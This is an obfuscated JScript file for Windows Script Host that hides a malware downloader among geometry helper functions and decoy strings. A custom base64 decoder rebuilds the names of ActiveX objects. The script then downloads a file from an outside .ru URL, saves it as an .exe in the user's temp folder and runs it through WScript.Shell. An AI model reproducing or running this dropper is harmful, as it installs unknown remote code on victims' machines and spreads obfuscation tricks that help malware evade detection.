
var alarm = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  braids = [];
	
var dispensation = { ':': '.','U': 'S','381': 'X'};
	var indubitable = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function alumina(gotta) {
	abbots = gotta;
	for (var i in dispensation){abbots = abbots.replace(i, dispensation[i]);}
    return abbots;
};

var doggerel = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.alumina4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("prodigal").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = alarm[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = alarm[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = alarm[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = alarm[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var drives ="prodigalJVprodigalRFTVprodigalAl".alumina4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var reunion = "prodigalQWprodigalN0aXZprodigallWE9iaprodigalmVjdA=prodigal=".alumina4();
String.prototype.alumina2 = function () {
    var remiss = {
        uzbekistan: this
    };
    remiss.unction = remiss.uzbekistan["c3Vic3RyaW5n".alumina4()](indubitable, doggerel);
    return remiss.unction;
};

var container ="prodigalRXhwYW5prodigalkRW52aXprodigalJvbm1lbnRTdHJprodigalpbmdz".alumina4();
var Native = function(options){
	
};
var ideally = [reunion, container,drives,  ""+"."+("thirty","compared","pleasant","beautify","whitehall","harass","erudition","corinth","exe"), "UnVu".alumina4(), alumina("M"+"SX"+"ML"+("trample","magistracy","unveil","trained","panel","interwoven","determination","2.")+"381M"+"LH"+"TT"+("greatest","intend","perpetuate","schedules","producer","improvements","memorabilia","affecting","P>")+"WU"+("accordingly","information","interventions","uganda","traditional","coffee","recycling","cr")+("organist","jauntily","integrating","loading","adult","adorer","travelers","troupe","ip")+"t:"+("tombstone","inoculation","stockholm","institutes","comfortable","usual","considers","noose","Sh")+"ell")];
compiled = "_F2_";
var hacking = this[ideally.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
XgjEXj = "AkhMgjasCcF";
labels = (("marshy", "milfs", "helmet", "wyoming", "properly", "erratic", "buckle", "pXixwcob") + "AnxpRh").alumina2();
recording = (("foreground", "concrete", "clink", "divergent", "glint", "lowest", "harboured", "breath", "inside", "sERAvIoNTEK") + "zAubBhpWhR").alumina2();
  
    String.prototype.antithesis = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var rowdy = ideally.pop().split(">");

simplify = "b3Blbg==".alumina4();
var towns = new hacking(rowdy[1]);
var unwieldy = new hacking(rowdy[0]);
var supplies = towns[ideally.shift()](ideally.shift());
weasel = "E";

var crisis = ideally.shift();
var renaissance = ideally.shift();
function underlie(involvement, olympic) {

    try {
        var prague = supplies + "/" + olympic ;
		prague = prague+ crisis;
            unwieldy[simplify](("froze","labels","G" + weasel) + ("lingo","proverbial","alibi","organ","T"), involvement, false);
       
    IhpVexnL = "_F7_";
    unwieldy[recording + ("slovenia","plaintiff","end")]();
	var commented=("labels" + WScript=="labels" + "V2luZG93cyBTY3JpcHQgSG9zdA==".alumina4())&&unwieldy["c3RhdHVz".alumina4()] +""=="MjAw".alumina4()&&typeof(TYxuzbFVXjn)==="undefined";
	lQHNgR = "_F8_";
    if (commented) {
		
        var vishnu = new hacking((("aptitude","passengers","hentai","levant","forthcoming","obsequies","apocryphal","amend","A")+("palestine","glazed","website","omniscient","broad","richardson","fabrication","infanticide","SEOO")+"DB"+("instructions","chicks","heretic","inflame","untried","amenities","shaven",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        vishnu[simplify]();
        LsNzJyKqYUY = "_F9_";
        vishnu.type = doggerel;
        fitfLjpGRRO = "_F10_";
        vishnu["d3JpdGU=".alumina4()](unwieldy[("cronies","parlance","charts","delays","trees","inflation","intonation","")+"R"+"es"+"pon"+dispensation['U'].toLowerCase()+"e"+"Qm9keQ==".alumina4()]);
        cYBABtXXD = "_F11_";
        vishnu[(labels + "o"+("chuck","transport","compute","sticky","appointments","unfriendly","inertia","laptops","00")+("slave","characterized","tolerate","jostle","eclipse","importune","career","8i")+"tion").replace("0"+("monte","genius","heterogeneous","crawford","feeling","brunswick","inaudible","08"), recording)] = 0;
        WNBwuYBvS = "_F12_";
        vishnu.saveToFile(prague, 2);
        aEprHzjNTGa = "_F13_";
        vishnu.close();
        DnwJWkOFVbo = "_F14_";
		towns[renaissance](prague, doggerel, true);
    }
} catch (lEDpNpfw) { };

    PAxJkRbjkdW = "_F15_";
}
try{
underlie("aHR0cDovLw==".alumina4()+"\u0074\u0073\u0070\u0069\u0070\u0070"+"\u002E\u0074\u0073\u0075\u002E\u0074\u0075\u006C\u0061\u002E\u0072\u0075\u002F\u0033\u0067\u0033\u0034\u0074\u0033\u0074\u0034\u0074\u0067\u0067\u0072\u0074" + "?eknYKcqFm=YpPfcV","YDADSMMYYLs");}catch(vLWrShupqd){}

   OPLMAhS = "_F16_";
   